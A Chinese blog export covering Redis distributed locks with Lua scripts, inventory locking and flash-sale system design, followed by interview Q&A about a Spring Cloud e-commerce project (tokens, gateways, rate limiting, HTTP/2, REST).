<h3 id="3）缓存击穿"><a href="#3）缓存击穿" class="headerlink" title="3）缓存击穿"></a>3）缓存击穿</h3><p>缓存击穿，是指一个key非常热点，在不停的扛着大并发，大并发集中对这一个点进行访问，当这个key在失效的瞬间，持续的大并发就穿破缓存，直接请求数据库，就像在一个屏障上凿开了一个洞。</p>
<p>解决思路：热点的key永不过期即可。</p>
<h2 id="4-11-Redis实现分布式锁"><a href="#4-11-Redis实现分布式锁" class="headerlink" title="4.11.Redis实现分布式锁"></a>4.11.Redis实现分布式锁</h2><p>分布式锁要满足的条件：</p>
<ul>
<li>多进程互斥：同一时刻，只有一个进程可以获取锁</li>
<li>保证锁可以释放：任务结束或出现异常，锁一定要释放，避免死锁</li>
<li>阻塞锁（可选）：获取锁失败时可否重试</li>
<li>重入锁（可选）：获取锁的代码递归调用时，依然可以获取锁</li>
</ul>
<h3 id="1）最基本的分布式锁："><a href="#1）最基本的分布式锁：" class="headerlink" title="1）最基本的分布式锁："></a>1）最基本的分布式锁：</h3><p>利用Redis的setnx命令，这个命令的特征时如果多次执行，只有第一次执行会成功，可以实现<code>互斥</code>的效果。但是为了保证服务宕机时也可以释放锁，需要利用expire命令给锁设置一个有效期</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setnx lock thread-01 # 尝试获取锁</span><br><span class="line">expire lock 10 # 设置有效期</span><br></pre></td></tr></table></figure>

<p><strong>面试官问题1</strong>：如果expire之前服务宕机怎么办？</p>
<p>要保证setnx和expire命令的原子性。redis的set命令可以满足：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set key value [NX] [EX time] </span><br></pre></td></tr></table></figure>

<p>需要添加nx和ex的选项：</p>
<ul>
<li>NX：与setnx一致，第一次执行成功</li>
<li>EX：设置过期时间</li>
</ul>
<p><strong>面试官问题2</strong>：释放锁的时候，如果自己的锁已经过期了，此时会出现安全漏洞，如何解决？</p>
<p>在锁中存储当前进程和线程标识，释放锁时对锁的标识判断，如果是自己的则删除，不是则放弃操作。</p>
<p>但是这两步操作要保证原子性，需要通过Lua脚本来实现。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if redis.call(&quot;get&quot;,KEYS[1]) == ARGV[1] then</span><br><span class="line">    redis.call(&quot;del&quot;,KEYS[1])</span><br><span class="line">end</span><br></pre></td></tr></table></figure>



<h3 id="2-可重入分布式锁"><a href="#2-可重入分布式锁" class="headerlink" title="2)可重入分布式锁"></a>2)可重入分布式锁</h3><p>如果有重入的需求，则除了在锁中记录进程标识，还要记录重试次数，流程如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142558.png" alt="1574824172228"> </p>
<p>下面我们假设锁的key为“<code>lock</code>”，hashKey是当前线程的id：“<code>threadId</code>”，锁自动释放时间假设为20</p>
<p>获取锁的步骤：</p>
<ul>
<li>1、判断lock是否存在 <code>EXISTS lock</code><ul>
<li>存在，说明有人获取锁了，下面判断是不是自己的锁<ul>
<li>判断当前线程id作为hashKey是否存在：<code>HEXISTS lock threadId</code><ul>
<li>不存在，说明锁已经有了，且不是自己获取的，锁获取失败，end</li>
<li>存在，说明是自己获取的锁，重入次数+1：<code>HINCRBY lock threadId 1</code>，去到步骤3</li>
</ul>
</li>
</ul>
</li>
<li>2、不存在，说明可以获取锁，<code>HSET key threadId 1</code></li>
<li>3、设置锁自动释放时间，<code>EXPIRE lock 20</code></li>
</ul>
</li>
</ul>
<p>释放锁的步骤：</p>
<ul>
<li>1、判断当前线程id作为hashKey是否存在：<code>HEXISTS lock threadId</code><ul>
<li>不存在，说明锁已经失效，不用管了</li>
<li>存在，说明锁还在，重入次数减1：<code>HINCRBY lock threadId -1</code>，获取新的重入次数</li>
</ul>
</li>
<li>2、判断重入次数是否为0：<ul>
<li>为0，说明锁全部释放，删除key：<code>DEL lock</code></li>
<li>大于0，说明锁还在使用，重置有效时间：<code>EXPIRE lock 20</code></li>
</ul>
</li>
</ul>
<p>对应的Lua脚本如下：</p>
<p>首先是获取锁：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> key = KEYS[<span class="number">1</span>]; <span class="comment">-- 锁的key</span></span><br><span class="line"><span class="keyword">local</span> threadId = ARGV[<span class="number">1</span>]; <span class="comment">-- 线程唯一标识</span></span><br><span class="line"><span class="keyword">local</span> releaseTime = ARGV[<span class="number">2</span>]; <span class="comment">-- 锁的自动释放时间</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(redis.call(<span class="string">&#x27;exists&#x27;</span>, key) == <span class="number">0</span>) <span class="keyword">then</span> <span class="comment">-- 判断是否存在</span></span><br><span class="line">	redis.call(<span class="string">&#x27;hset&#x27;</span>, key, threadId, <span class="string">&#x27;1&#x27;</span>); <span class="comment">-- 不存在, 获取锁</span></span><br><span class="line">	redis.call(<span class="string">&#x27;expire&#x27;</span>, key, releaseTime); <span class="comment">-- 设置有效期</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>; <span class="comment">-- 返回结果</span></span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(redis.call(<span class="string">&#x27;hexists&#x27;</span>, key, threadId) == <span class="number">1</span>) <span class="keyword">then</span> <span class="comment">-- 锁已经存在，判断threadId是否是自己	</span></span><br><span class="line">	redis.call(<span class="string">&#x27;hincrby&#x27;</span>, key, threadId, <span class="string">&#x27;1&#x27;</span>); <span class="comment">-- 不存在, 获取锁，重入次数+1</span></span><br><span class="line">	redis.call(<span class="string">&#x27;expire&#x27;</span>, key, releaseTime); <span class="comment">-- 设置有效期</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>; <span class="comment">-- 返回结果</span></span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">-- 代码走到这里,说明获取锁的不是自己，获取锁失败</span></span><br></pre></td></tr></table></figure>

<p>然后是释放锁：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> key = KEYS[<span class="number">1</span>]; <span class="comment">-- 锁的key</span></span><br><span class="line"><span class="keyword">local</span> threadId = ARGV[<span class="number">1</span>]; <span class="comment">-- 线程唯一标识</span></span><br><span class="line"><span class="keyword">local</span> releaseTime = ARGV[<span class="number">2</span>]; <span class="comment">-- 锁的自动释放时间</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (redis.call(<span class="string">&#x27;HEXISTS&#x27;</span>, key, threadId) == <span class="number">0</span>) <span class="keyword">then</span> <span class="comment">-- 判断当前锁是否还是被自己持有</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>; <span class="comment">-- 如果已经不是自己，则直接返回</span></span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">local</span> count = redis.call(<span class="string">&#x27;HINCRBY&#x27;</span>, key, threadId, <span class="number">-1</span>); <span class="comment">-- 是自己的锁，则重入次数-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">0</span>) <span class="keyword">then</span> <span class="comment">-- 判断是否重入次数是否已经为0</span></span><br><span class="line">    redis.call(<span class="string">&#x27;EXPIRE&#x27;</span>, key, releaseTime); <span class="comment">-- 大于0说明不能释放锁，重置有效期然后返回</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    redis.call(<span class="string">&#x27;DEL&#x27;</span>, key); <span class="comment">-- 等于0说明可以释放锁，直接删除</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure>



<h3 id="3-高可用的锁"><a href="#3-高可用的锁" class="headerlink" title="3)高可用的锁"></a>3)高可用的锁</h3><p><code>面试官问题</code>：redis分布式锁依赖与redis，如果redis宕机则锁失效。如何解决？</p>
<p>此时大多数同学会回答说：搭建主从集群，做数据备份。</p>
<p>这样就进入了陷阱，因为面试官的下一个问题就来了：</p>
<p><code>面试官问题</code>：如果搭建主从集群做数据备份时，进程A获取锁，master还没有把数据备份到slave，master宕机，slave升级为master，此时原来锁失效，其它进程也可以获取锁，出现安全问题。如何解决？</p>
<p>关于这个问题，Redis官网给出了解决方案，使用RedLock思路可以解决：</p>
<blockquote>
<p>在Redis的分布式环境中，我们假设有N个Redis master。这些节点完全互相独立，不存在主从复制或者其他集群协调机制。之前我们已经描述了在Redis单实例下怎么安全地获取和释放锁。我们确保将在每（N)个实例上使用此方法获取和释放锁。在这个样例中，我们假设有5个Redis master节点，这是一个比较合理的设置，所以我们需要在5台机器上面或者5台虚拟机上面运行这些实例，这样保证他们不会同时都宕掉。</p>
<p>为了取到锁，客户端应该执行以下操作:</p>
<ol>
<li>获取当前Unix时间，以毫秒为单位。</li>
<li>依次尝试从N个实例，使用相同的key和随机值获取锁。在步骤2，当向Redis设置锁时,客户端应该设置一个网络连接和响应超时时间，这个超时时间应该小于锁的失效时间。例如你的锁自动失效时间为10秒，则超时时间应该在5-50毫秒之间。这样可以避免服务器端Redis已经挂掉的情况下，客户端还在死死地等待响应结果。如果服务器端没有在规定时间内响应，客户端应该尽快尝试另外一个Redis实例。</li>
<li>客户端使用当前时间减去开始获取锁时间（步骤1记录的时间）就得到获取锁使用的时间。当且仅当从大多数（这里是3个节点）的Redis节点都取到锁，并且使用的时间小于锁失效时间时，锁才算获取成功。</li>
<li>如果取到了锁，key的真正有效时间等于有效时间减去获取锁所使用的时间（步骤3计算的结果）。</li>
<li>如果因为某些原因，获取锁失败（<em>没有</em>在至少N&#x2F;2+1个Redis实例取到锁或者取锁时间已经超过了有效时间），客户端应该在所有的Redis实例上进行解锁（即便某些Redis实例根本就没有加锁成功）。</li>
</ol>
</blockquote>
<h1 id="5-秒杀相关"><a href="#5-秒杀相关" class="headerlink" title="5.秒杀相关"></a>5.秒杀相关</h1><h2 id="5-1-锁，减库存"><a href="#5-1-锁，减库存" class="headerlink" title="5.1.锁，减库存"></a>5.1.锁，减库存</h2><h3 id="1）悲观锁"><a href="#1）悲观锁" class="headerlink" title="1）悲观锁"></a>1）悲观锁</h3><p>总是假设最坏的情况，每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会阻塞直到它拿到锁（共享资源每次只给一个线程使用，其它线程阻塞，用完后再把资源转让给其它线程）。传统的关系型数据库里边就用到了很多这种锁机制，比如行锁，表锁等，读锁，写锁等，都是在做操作之前先上锁。Java中synchronized和ReentrantLock等独占锁就是悲观锁思想的实现。</p>
<p>以减库存为例来说：</p>
<p>减库存先要查询库存，判断库存是否充足，然后再减库存。</p>
<p>如果我们查询库存后，判断库存是充足的，此时有人修改了库存，则我们的判断就不准确了，此时写数据就会又库存超卖的风险。</p>
<p>必须保证从查询开始就锁定数据，保证其它人无法操作，可以通过下列方式实现：</p>
<ul>
<li><p>同步方法或Synchronized：适用于单点项目，分布式下会失效。</p>
</li>
<li><p>分布式锁：把整个减库存方法通过分布式锁锁定，不允许他人执行减库存逻辑</p>
</li>
<li><p>数据库锁：在执行查询语句时，在语句后面跟上 for update，则查询即会对数据加锁，其它人就无法操作了。</p>
</li>
</ul>
<h3 id="2）乐观锁"><a href="#2）乐观锁" class="headerlink" title="2）乐观锁"></a>2）乐观锁</h3><p>总是假设最好的情况，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，可以使用版本号机制和CAS算法实现。乐观锁适用于多读的应用类型，这样可以提高吞吐量，像数据库提供的类似于write_condition机制，其实都是提供的乐观锁。在Java中java.util.concurrent.atomic包下面的AtomicInteger就是使用了乐观锁的一种实现方式CAS实现的。</p>
<p>以减库存为例来说：</p>
<p>减库存先要查询库存，判断库存是否充足，然后再减库存。</p>
<p>如果我们查询库存后，判断库存是充足的，此时有人修改了库存，则我们的判断就不准确了，此时写数据就会又库存超卖的风险。</p>
<p>我们假设自己减库存时没有其它人在操作，不过执行sql时对库存检查即可。</p>
<h4 id="方式1：版本号"><a href="#方式1：版本号" class="headerlink" title="方式1：版本号"></a>方式1：版本号</h4><p>在库存表添加version字段，每次修改数据都对version执行+1操做。</p>
<p>减库存步骤：</p>
<ul>
<li>查询version值，例如此时version是20</li>
<li>执行减库存，在where条件中判断 version值是否等于查询到的version值：<ul>
<li>UPDATE tb_stock SET stock &#x3D; stock - 1, version &#x3D; 21 WHERE id &#x3D; 101 AND version &#x3D; 20</li>
</ul>
</li>
</ul>
<h4 id="方式2：判断库存"><a href="#方式2：判断库存" class="headerlink" title="方式2：判断库存"></a>方式2：判断库存</h4><p>因为库存本身就是数值，可以用库存来做检查，代替版本号：</p>
<ul>
<li>查询库存，例如值是20，需要减库存值为 2</li>
<li>减库存：UPDATE tb_stock SET stock &#x3D; 18 WHERE id &#x3D; 101 AND stock &#x3D; 20</li>
</ul>
<p>这种方式可能有安全漏洞，即CAS这ABA问题，比如我查询的时候是20，有人购买了一个商品，变成了19，然后又有人退货，库存恢复为20。我们认为库存没变，其实此时已经有人修改了数据了。</p>
<h3 id="方式3：无符号数"><a href="#方式3：无符号数" class="headerlink" title="方式3：无符号数"></a>方式3：无符号数</h3><p>库存是数字，如果我们把库存变成无符号数字，则数据库默认不能为负，如果减库存传入的值为负数，数据库直接报错，因此减库存时无需做特殊判断，直接减库存即可。</p>
<h3 id="3）使用场景"><a href="#3）使用场景" class="headerlink" title="3）使用场景"></a>3）使用场景</h3><p>乐观锁适用于写比较少的情况下（多读场景），即冲突真的很少发生的时候，这样可以省去了锁的开销，加大了系统的整个吞吐量。但如果是多写的情况，一般会经常产生冲突，这就会导致上层应用会不断的进行retry，这样反倒是降低了性能，所以一般多写的场景下用悲观锁就比较合适。</p>
<h2 id="5-2-秒杀思路"><a href="#5-2-秒杀思路" class="headerlink" title="5.2.秒杀思路"></a>5.2.秒杀思路</h2><p>秒杀问题的难点：</p>
<ul>
<li>高并发，服务端tomcat并发能力有限</li>
<li>减库存多线程执行容易超卖</li>
<li>下单业务流程、业务链路较长，耗时较久，服务QPS低</li>
<li>秒杀页面请求量大</li>
<li>秒杀机器人防范</li>
</ul>
<p>具体实现：</p>
<h3 id="5-2-1-前端优化"><a href="#5-2-1-前端优化" class="headerlink" title="5.2.1.前端优化"></a>5.2.1.前端优化</h3><p>前端是直接与用户交互的地方，并发最高，一般有下面手段去处理：</p>
<h4 id="1）页面静态化"><a href="#1）页面静态化" class="headerlink" title="1）页面静态化"></a>1）<strong>页面静态化</strong></h4><p>将秒杀商品页面静态化处理，少量动态数据通过ajax异步加载，访问商品页面无需去数据库查询商品信息，大大提高页面加载的速度。</p>
<h4 id="2）CDN服务"><a href="#2）CDN服务" class="headerlink" title="2）CDN服务"></a>2）<strong>CDN服务</strong></h4><p>静态化可以让页面响应速度增加，但是如果我们的静态资源服务器压力过大，也可以考虑购买CDN服务，将静态资源部署到CDN服务，一方面提高响应速度，另一方面减轻对服务端压力</p>
<h4 id="3）秒杀限流"><a href="#3）秒杀限流" class="headerlink" title="3）秒杀限流"></a>3）秒杀限流</h4><p>秒杀按钮点击时，不立即向服务端发送请求，而是要求回答验证问题答案，回答结束才发送秒杀请求。好处有2点：</p>
<ul>
<li>用户回答问题耗时不同，把用户发送请求分散到不同事件段</li>
<li>限制秒杀机器人或爬虫的恶意访问</li>
</ul>
<h4 id="4）动态秒杀按钮"><a href="#4）动态秒杀按钮" class="headerlink" title="4）动态秒杀按钮"></a>4）动态秒杀按钮</h4><p>为了避免秒杀开始前有人提前获取秒杀地址并编写秒杀机器人，我们可以把秒杀按钮利用JS绑定，秒杀开始前对应的JS文件内容设置为点击后禁止发送请求。</p>
<p>秒杀开始时，我们再修改对应的JS文件内容，填写真实发送请求地址，这样开始前不会有人知道秒杀的地址信息。</p>
<h4 id="5）避免重复连续点击"><a href="#5）避免重复连续点击" class="headerlink" title="5）避免重复连续点击"></a>5）避免重复连续点击</h4><p>点击秒杀后，按钮禁用，一定时间后开启使用</p>
<h3 id="5-2-2-网关"><a href="#5-2-2-网关" class="headerlink" title="5.2.2.网关"></a>5.2.2.网关</h3><p>如果采用Nginx作为网关，则可以再Nginx中对用户请求限流，只放行部分用户请求到达微服务群。</p>
<h3 id="5-2-3-微服务"><a href="#5-2-3-微服务" class="headerlink" title="5.2.3.微服务"></a>5.2.3.微服务</h3><h4 id="1）限流"><a href="#1）限流" class="headerlink" title="1）限流"></a>1）限流</h4><p>RateLimiter是guava提供的基于令牌桶算法的限流实现类，通过调整生成token的速率来限制用户频繁访问秒杀页面，从而达到防止超大流量冲垮系统。（令牌桶算法的原理是系统会以一个恒定的速度往桶里放入令牌，而如果请求需要被处理，则需要先从桶里获取一个令牌，当桶里没有令牌可取时，则拒绝服务。</p>
<h4 id="2）预减库存"><a href="#2）预减库存" class="headerlink" title="2）预减库存"></a>2）预减库存</h4><p>请求到达服务端，并发依然很高，数据库直接处理肯定难以接受。</p>
<p>我们可以把秒杀的商品库存存入Redis，利用Redis中的库存判断秒杀商品是否充足，再Redis中完成抢购资格判断、减库存行为。</p>
<p>但是，尽管redis单线程运行，执行Redis的Java代码依然有线程安全风险，所以为了保证redis中减库存判断的安全性，这里推荐使用Lua脚本编写相关逻辑，保证代码执行的原子性。</p>
<h4 id="3）流量削峰，异步写数据"><a href="#3）流量削峰，异步写数据" class="headerlink" title="3）流量削峰，异步写数据"></a>3）流量削峰，异步写数据</h4><p>经过Redis的判断处理，单个商品放行的请求数量基本就是库存剩余量，请求大大减少，但是如果参与秒杀商品较多，用户并发依然很高，数据库可能依然难以处理，所以还需要把下的业务异步执行，实现流量削峰。</p>
<p>用户在redis中获取下单资格后，不要去执行下单逻辑，而是把用户及资格信息发送到MQ中，然后就返回用户抢购成功的结果。</p>
<p>此时服务端下单的业务监听RabbitMQ，逐个处理MQ中的下单消息，利用MQ来缓存高并发的流量。变同步写数据为异步写数据，大大缩短业务链路，提高并发。</p>
<p>流程图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142559.png" alt="1574835214511"> </p>
<p>监听到MQ后的处理逻辑，关键时如何防止库存超卖，这一点我们在上面的5.1中已经讲过，不再赘述。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142560.png" alt="1574835276351"> </p>
<p>秒杀项目相关资料：<a href="https://github.com/qiurunze123/miaosha">https://github.com/qiurunze123/miaosha</a></p>
<h1 id="6-分布式事务"><a href="#6-分布式事务" class="headerlink" title="6.分布式事务"></a>6.分布式事务</h1><p>详见另一份文档：分布式事务解决方案</p>
]]></content>
      <categories>
        <category>Leyou</category>
      </categories>
      <tags>
        <tag>Leyou</tag>
      </tags>
  </entry>
  <entry>
    <title>leyou常见问题</title>
    <url>/2021/12/21/leyou/leyou%E9%9D%A2%E8%AF%95%E7%89%88/</url>
    <content><![CDATA[<h1 id="项目问题"><a href="#项目问题" class="headerlink" title="项目问题"></a>项目问题</h1><p>乐优商城采用了前后端分离的架构方式，</p>
<ul>
<li>前端采用Vue技术栈，从使用者的角度，分为：<ul>
<li>前台门户系统：支持H5</li>
<li>后台管理系统：基于Vue实现的单页应用（SPA），实现管理功能</li>
</ul>
</li>
<li>服务端采用SpringCloud技术栈形成微服务集群，会包括：<ul>
<li>商品微服务：商品及商品分类、品牌、库存等的服务</li>
<li>搜索微服务：实现搜索功能</li>
<li>交易微服务：实现订单相关业务、实现购物车相关业务</li>
<li>用户服务：用户的登录注册、用户信息管理等功能</li>
<li>短信服务：完成各种短信的发送任务</li>
<li>支付服务：对接微信支付平台</li>
<li>授权服务：完成对用户的授权、鉴权等功能</li>
</ul>
</li>
</ul>
<p>如果有项目的话，技术面试第一步，面试官一般都是让你自己介绍一下你的项目。你可以从下面</p>
<p>几个方向来考虑:</p>
<ol>
<li><p>对项目整体设计的一个感受(面试官可能会让你画系统的架构图)</p>
</li>
<li><p>在这个项目中你负责了什么、做了什么、担任了什么⻆色</p>
</li>
<li><p>从这个项目中你学会了那些东⻄，使用到了那些技术，学会了那些新技术的使用</p>
</li>
<li><p>另外项目描述中，最好可以体现自己的综合素质，比如你是如何协调项目组成员协同开发的</p>
<p>或者在遇到某一个棘手的问题的时候你是如何解决的又或者说你在这个项目用了什么技术实 现了什么功能比如:用redis做缓存提高访问速度和并发量、使用消息队列削峰和降流等等。</p>
</li>
</ol>
<p>面试官，您好!我叫秀儿。研究生期间时间我主要利用课外时间学习了 Java 以及 jvm, mysql, redis等框架 。在校期间参与过一个B2C的类京东的电商网站的开发，乐购生活项目是采用分布式服务系统架构打造的 B2C 模式的电商网站,整个项目分为运营商家后台管理系统、门户网 站两个子系统.项目采用微服务架构,前后端分离,微服务技术采用了Spring Cloud 技术栈,各个微服务站点基于 Spring Boot 构 建.各个微服务之间采用RabbitMQ 实现异步通信,降低系统之间的耦合度,提高了系统的扩展性以及部署的灵活性.使用Redis 做 系统缓存,提高系统的性能,热点页面采用了 openresty 页面静态化技术. 生活中我是一个比􏰀积极乐观的人，一般会通过跑步健身的方式来放松。我 一直都非常想加入贵公司，我觉得贵公司的文化和技术氛围我都非常喜欢，期待能与你共事;</p>
<p>Q：希望能够着重讲一下<a href="https://www.zhihu.com/question/452184164">项目</a>经历以及扮演的角色</p>
<p>A：具体讲了一下自己做的一个微服务<a href="https://www.zhihu.com/question/452184164">项目</a>，有xxx功能，从GateWay到Sentinel以及Redis和MQ等技术，讲了讲如何在网关层面通过Token鉴权（同时穿插自己对技术选型的考量）</p>
<p>我们整个项目采用的是前后端分离开发模式。</p>
<ul>
<li><p>前端分为两部分：</p>
<ul>
<li>后台管理：主要面向的是数据管理人员，采用基于Vue的单页应用开发方式</li>
<li>门户系统：面向的是客户，门户采用的是Vue结合Nuxt实现服务端渲染方式</li>
</ul>
</li>
<li><p>后端</p>
<p>后端采用基于SpringCloud的微服务架构，统一对外提供Rest风格接口，无论是后台管理还是门户系统都共享这些微服务接口，而微服务中通过JWT方式来识别用户身份，开放不同接口。</p>
<p>到这里先不说了。如果继续追问微服务拆分粒度或者SpringCloud细节，再接着回答我们的服务拆分。</p>
</li>
</ul>
<p>Q：OK，那我们一个一个技术点聊，首先讲讲token的技术原理吧？</p>
<p>A：在<a href="https://www.zhihu.com/question/452184164">项目</a>中用到的Token是通过JJWT生成的，然后讲了讲PayLoad以及相关内容，最后讲Token防篡改等好处</p>
<p>Q：如果Token被第三方截获了怎么办？</p>
<p>A：使用HTTPS，以下省略八股文若干</p>
<p>Q：假设一个场景：用户的Token被从某js插件直接截获并拿到别的机器上访问你的接口，怎么办？</p>
<p>A：（对于这个问题有点懵，因为你浏览器里存的内容都能被拿了那似乎也没有什么特别好的方法处理了，但是后来想了想可以把用户ip或者mac地址放进去，但我感觉还是治标不治本，希望有大佬能帮我解答一下）思考了一下然后说把token的有效时间缩短（给自己埋了坑）这个是xss攻击吧,只需要设置httponly就可以防御;</p>
<p>Q：那如果用户在写文章，写了半个小时，你缩减了token的有效时间，用户的体验会变差很多，这种情况怎么办？</p>
<p>A：讲了讲token过期如何延期（把自己更加带进坑里了）</p>
<p>Q：那你又要缩短token有效时间，又要延期这不是很矛盾吗？况且你延期的话导致接口的风险也会逐渐增加呢？A：我真不知道了呜呜呜！（其实感觉这里该讲讲如何判断用户活跃的，用户活跃再进行延期，不过第一次面大厂真的被问懵了）</p>
<p>Q：没关系这只是作为开放性探讨的问题而已（被安慰一下还是挺好的）</p>
<p>Q：你说你用GateWay对微服务进行转发，那如果某个接口的访问特别慢，你如何避免的你网关被这个特别慢的微服务拖垮呢？</p>
<p>A：(一开始没太听懂，面试官又详细描述了一下场景) 如果接口访问特别慢，我们在选型的时候使用了Sentinel，Sentinel可以对慢接口进行降级，然后讲了讲Sentinel是怎么用的</p>
<p>Q：降级也是一种策略，那如果这个问题产生的原因是你的微服务自身的问题，不用Sentinel如何去解决？（插一句，这里后面复盘的时候才反应过来面试官应该是想问如何排查慢服务，比如从SQL、网络等方面进行解答，但是token那个问题真是把我问懵了，后续的问题人都是处于一种麻木的状态）</p>
<p>A：调用接口的时候可以设置超时时间，讲了讲FailBack之类的。</p>
<p>Q：如果我们想要查明这个慢，究竟是因为网络比较慢，还是因为复杂业务比较慢，该如何排查？然后给了一个详细的不能再详细的场景（已经明示了2333)</p>
<p>A：首先排查是否为网络原因，其次是排查服务中是否有复杂流程，最后检查是否因为第三方框架的不完善等等导致缓慢</p>
<p>Q：那我们现在如果已经确定了是网络比较慢，怀疑是发生了丢包，如何去确认？</p>
<p>A：ping命令（tcpdump 我看过但忘记了！！！</p>
<p>Q：建议回去了解一下tcpdump</p>
<p>Q：你认为消息队列是什么呢？</p>
<p>A：讲了讲自己的理解（觉得他和操作系统里面的消息队列差不多），然后说了说生产者消费者模型</p>
<p>Q：如果一个消息投递了多次都没成功怎么办？</p>
<p>A：会把消息持久化（忘了答死信队列，裂开）</p>
<p>Q：如何持久化？</p>
<p>A：确实没怎么了解过</p>
<p>Q：这些偏向底层的东西没看过确实不太好回答，没关系的，我们下面来聊一些基础的问题（内心OS：终于到我最喜欢的Java八股文了吗，嘿嘿嘿）</p>
<p>Q：操作系统学过吧，举个简单栗子，我们今天写了个Java应用，打开了一个文件句柄，在文件句柄中写入了一行字符串，flush这个文件句柄最后close掉，从操作系统层面讲讲这期间发生了哪些事情？</p>
<p>A：胡扯了一些然后说不太了解（为什么别人问操作系统都是线程进程死锁之类的，我的这么“简单”呜呜呜</p>
<p>Q：那你讲讲进程间通信的方式吧？</p>
<p>A：八股文若干</p>
<p>Q：OK，那我们接下来问问数据库方面的，一条普通的查询语句执行的流程是什么？</p>
<p>A：我真的是被问懵了，这里应该答连接器，解析器优化器之类的，结果我说到怎么在B+树上查找去了，甚至还扯了MVCC，我感觉面试官听着都尴尬</p>
<p>Q：这个基础部分你掌握的不够扎实啊，如果一条SQL语句执行的比较慢怎么办？（我心想我已经凉了，ε&#x3D;(´ο｀*)))唉</p>
<p>A：explain 以及相应的分析</p>
<p>Q：HTTP了解过吧，HTTP2.0和HTTP1.1的区别？</p>
<p>A：  HTTP2.0使用了多路复用的技术，做到同一个连接并发处理多个请求，而且并发请求的数量比HTTP1.1大了好几个数量级。HTTP1.1也可以多建立几个TCP连接，来支持处理更多并发的请求，但是创建TCP连接本身也是有开销的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149721.jpeg" alt="img"></p>
<p>​    HTTP1.1不支持header数据的压缩，HTTP2.0使用HPACK算法对header的数据进行压缩，这样数据体积小了，在网络上传输就会更快。</p>
<p> 为了改善延迟，HTTP2.0引入了server push，它允许服务端推送资源给浏览器，在浏览器明确地请求之前，免得客户端再次创建连接发送请求到服务器端获取。这样客户端可以直接从本地加载这些资源，不用再通过网络。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149722.jpeg" alt="img"></p>
<p>Q：你说<a href="">项目</a>中用了前后端分离以及RESTful，什么是RESTful？</p>
<p>A：RESTful 是目前最流行的 API 设计规范，用于 Web 数据接口的设计; RESTful 的核心思想就是，客户端发出的数据操作指令都是”动词 + 宾语”的结构。比如，GET &#x2F;articles这个命令，GET是动词，&#x2F;articles是宾语。宾语必须是名词</p>
<p>有些客户端只能使用GET和POST这两种方法。服务器必须接受POST模拟其他三个方法（PUT、PATCH、DELETE）。</p>
<p>这时，客户端发出的 HTTP 请求，要加上X-HTTP-Method-Override属性，告诉服务器应该使用哪一个动词，覆盖POST方法。</p>
<p>为了统一起见，建议都使用复数 URL，比如GET &#x2F;articles&#x2F;2要好于GET &#x2F;article&#x2F;2。</p>
<p>常见的情况是，资源需要多级分类，因此很容易写出多级的 URL，比如获取某个作者的某一类文章。</p>
<p>更好的做法是，除了第一级，其他级别都用查询字符串表达。GET &#x2F;authors&#x2F;12?categories&#x3D;2</p>
<p>状态码必须精确; </p>
<p>Q：请求方式有哪些呀？</p>
<p>A：Options,Delete, Post, Get, Put, Trace等</p>
<p>Q：使用RESTful和直接加参数有什么区别吗？</p>
<p>A：我个人感觉是没什么区别2333</p>
<p>Q：为什么架构中要使用GateWay？</p>
<p>A：GateWay用来给各个微服务进行反代，然后详细说了一下怎么做的，为什么这么做</p>
<p>Q：如果让你来实现一个GateWay，你觉得要做哪些考量？</p>
<p>A：动态配置路由，负载均衡，支持自定义拦截等等详细讲了很多</p>
<p>Q：你说你在网关层面做了鉴权，详细讲讲？</p>
<p>A：在GateWay上写了一些规则，拦截用户的请求，解析token，然后又讲了讲token原理，如何加密（3DES）</p>
<p>Q：你有了解过各大厂商提供的网关服务吗？比如阿里<a href="">百度</a><a href="">腾讯</a>提供的？</p>
<p>A：没了解过</p>
<p>Q：你在网关上还做了限流？</p>
<p>A：Sentinel相关的内容，就把限流，降级，熔断的规则都讲了讲，然后把场景也讲了讲</p>
<p>Q：如果让你来实现一个限流框架，怎么做？（这方面还好我之前比较喜欢，去了解了比较多相关知识）</p>
<p>A：令牌桶，漏桶，semaphor等，然后利用Guava的RateLimiter详细的讲了一下令牌桶，又通过一个例子讲了一下Semaphor</p>
<p>Q：那漏桶呢？</p>
<p>A：补充了一下漏桶模型</p>
<p>Q：你觉得漏桶和令牌桶的区别在哪？</p>
<p>A：讲了一下自己对两者的理解</p>
<p>Q：Redis我看你也有用到，为什么Redis这么快？</p>
<p>A：八股</p>
<p>Q：IO多路复用详细讲一下</p>
<p>A：balabalabala</p>
<p>Q：netty有了解吗？</p>
<p>A：了解的不多</p>
<p>Q：<a href="">redis</a>的常用类型，zset的底层数据结构？</p>
